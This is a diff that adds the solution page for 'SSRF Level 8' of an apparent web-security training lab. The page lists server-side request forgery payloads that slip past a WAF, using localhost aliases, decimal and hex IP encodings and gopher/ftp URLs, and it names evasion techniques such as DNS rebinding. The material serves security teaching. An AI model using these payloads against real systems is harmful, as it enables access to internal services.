@@ -1,0 +1,51 @@
+{% extends 'base.html' %}
+
+{% block title %}SSRF Level 8 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-10 offset-md-1">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">SSRF Level 8 Solution: SSRF with WAF Bypass</h2>
+            </div>
+            <div class="card-body">
+                <h3>Solution</h3>
+                <p>This challenge demonstrates advanced WAF bypass techniques for SSRF exploitation against enterprise-grade security controls.</p>
+
+                <h4>Advanced Bypass Techniques:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># DNS-based bypasses
+http://localtest.me
+http://127.0.0.1.nip.io
+http://spoofed.burpcollaborator.net
+
+# Alternative representations
+http://2130706433
+http://0x7f000001
+http://localhost.localdomain
+
+# Protocol variations
+gopher://127.0.0.1:80
+ftp://127.0.0.1</code></pre>
+                    </div>
+                </div>
+
+                <h4>WAF Evasion Methods:</h4>
+                <ul>
+                    <li>DNS rebinding attacks</li>
+                    <li>URL encoding variations</li>
+                    <li>Protocol smuggling</li>
+                    <li>Parser confusion attacks</li>
+                </ul>
+
+                <div class="text-center mt-4">
+                    <a href="/ssrf/level8" class="btn btn-primary me-2">Try Challenge Again</a>
+                    <a href="/ssrf/level9" class="btn btn-success">Next Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
